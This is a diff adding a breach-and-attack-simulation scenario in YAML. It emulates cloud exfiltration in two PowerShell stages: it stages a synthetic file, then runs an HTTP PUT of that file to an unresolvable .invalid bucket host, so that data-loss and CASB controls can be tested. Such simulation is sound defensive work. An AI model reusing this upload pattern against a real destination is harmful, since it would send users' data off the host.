@@ -1,0 +1,119 @@
+id: collection-cloud-storage-exfil
+product_line: dlp
+name: Cloud Storage Upload Probe
+description: >
+  Telemetry-safe emulation of an adversary uploading staged data to a public
+  cloud storage service. The existing collection-staging-exfil Stage 10 only
+  checks whether cloud endpoints are reachable. This scenario goes one step
+  further and attempts an upload, shaped like an object-storage PUT, to a
+  bucket-style host under the RFC-6761 .invalid domain. Nothing resolves, so
+  nothing leaves the host.
+
+  KILL CHAIN STAGES:
+    1. Cloud Staging          — stage a synthetic [BAS-SIM] file in a per-run folder (T1074.001)
+    2. Cloud Object Upload    — PUT the file to a bucket-shaped .invalid host (T1567.002)
+
+  SAFETY: The file is synthetic. The destination is a .invalid host that cannot
+  resolve. No cloud account, credential, or real bucket is contacted. Files are
+  deleted in cleanup. Windows only. Telemetry mode.
+author: Audspect Research
+executable: true
+local_check: false
+supported_os: [windows]
+tags:
+  - collection
+  - cloud
+  - exfiltration
+  - dlp
+  - casb
+  - sse
+  - t1074
+  - t1567
+  - mitre
+mitre_phases:
+  - collection
+  - exfiltration
+
+live_policy:
+  block_on_domain_controller: true
+  require_dc_reachable: false
+  max_spray_attempts: 0
+  spray_account_allowlist: []
+  execution_window: ""
+
+steps:
+
+  # ---------------------------------------------------------------------------
+  # Stage 1 — Cloud Staging (T1074.001)
+  # ---------------------------------------------------------------------------
+  - name: "Cloud Exfil 1 — Stage Synthetic File for Cloud Upload (T1074.001)"
+    technique_id: T1074.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Writes one synthetic [BAS-SIM] file under %TEMP%\\bas_cloud_<runid>. No cloud client is installed or run."
+    telemetry:
+      - "Sysmon EID 11: staging file created under %TEMP%\\bas_cloud_<runid>"
+    detection:
+      - "DLP: file staged in a sync-client-style working folder ahead of an upload"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $work = Join-Path $env:TEMP "bas_cloud_$runId"
+      New-Item -ItemType Directory -Path $work -Force | Out-Null
+      $file = Join-Path $work 'synthetic_upload.txt'
+      Set-Content -Path $file -Value "[BAS-SIM] synthetic cloud-upload payload run=$runId - no real data" -Encoding UTF8
+      $exists = Test-Path $file
+      Write-Output "EXEC T1074.001: staged synthetic upload payload at $file (exists=$exists). Cloud Stage 1. [BAS-SIM-CLD-S1]"
+      if ($exists) {
+        Write-Output "FAIL: A file was staged for cloud upload with no alert. Staging ahead of an upload should be visible to DLP."
+      }
+    cleanup: ""
+
+  # ---------------------------------------------------------------------------
+  # Stage 2 — Cloud Object Upload Attempt (T1567.002)
+  # ---------------------------------------------------------------------------
+  - name: "Cloud Exfil 2 — Object-Storage PUT to a Bucket-Shaped .invalid Host (T1567.002)"
+    technique_id: T1567.002
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 30
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Issues an HTTP PUT of the synthetic file from Stage 1 to a bucket-shaped host under .invalid. The host cannot resolve, so nothing is uploaded. Generates Sysmon EID 22 and EID 3."
+    telemetry:
+      - "Sysmon EID 22: DNS query for the bucket-shaped .invalid host"
+      - "CASB/SSE: PUT to an unsanctioned object-storage endpoint"
+    detection:
+      - "CASB/SSE: upload to an unsanctioned cloud storage host — exfil block expected"
+      - "DLP: upload of a staged file to cloud storage"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $file = Join-Path $env:TEMP "bas_cloud_$runId\synthetic_upload.txt"
+      if (-not (Test-Path $file)) {
+        Write-Output "SKIP: T1567.002: no staged file from Stage 1 to upload. [BAS-SIM-CLD-S2]"
+        exit 0
+      }
+      $target = "http://bas-sim-bucket-$runId.invalid/objects/synthetic_upload.txt"
+      $reached = $false
+      try {
+        $r = Invoke-WebRequest -Uri $target -Method Put -InFile $file -ContentType 'text/plain' -TimeoutSec 10 -UseBasicParsing
+        if ($r.StatusCode) { $reached = $true }
+      } catch { $reached = $false }
+      Write-Output "EXEC T1567.002: attempted object-storage PUT of a synthetic file to $target. reached=$reached (expected: false). Cloud upload Stage 2. [BAS-SIM-CLD-S2]"
+      if ($reached) {
+        Write-Output "FAIL: An upload to an unsanctioned object-storage host succeeded. CASB or SSE is not blocking the unsanctioned cloud destination."
+      } else {
+        Write-Output "FAIL: The endpoint attempted an upload to an unsanctioned object-storage host. Unreachable only because the domain is .invalid; the attempt is the signal the CASB or SSE should block."
+      }
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_cloud_*') -Recurse -Force -ErrorAction SilentlyContinue
